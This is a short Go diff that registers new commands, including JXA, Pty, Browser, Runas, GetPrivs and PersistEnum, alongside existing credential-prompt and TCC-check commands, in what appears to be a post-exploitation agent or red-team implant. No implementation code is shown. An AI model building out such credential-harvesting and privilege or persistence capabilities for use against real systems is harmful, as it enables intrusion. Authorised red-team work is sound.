@@ -22,4 +22,13 @@ func registerPlatformCommands() {
 	RegisterCommand(&CredentialPromptCommand{})
 	RegisterCommand(&TCCCheckCommand{})
 	RegisterCommand(&EnvScanCommand{})
+	RegisterCommand(&JXACommand{})
+	RegisterCommand(&PtyCommand{})
+	RegisterCommand(&BrowserCommand{})
+	RegisterCommand(&RunasCommand{})
+	RegisterCommand(&FirewallCommand{})
+	RegisterCommand(&GetPrivsCommand{})
+	RegisterCommand(&NamedPipesCommand{})
+	RegisterCommand(&HandlesCommand{})
+	RegisterCommand(&PersistEnumCommand{})
 }
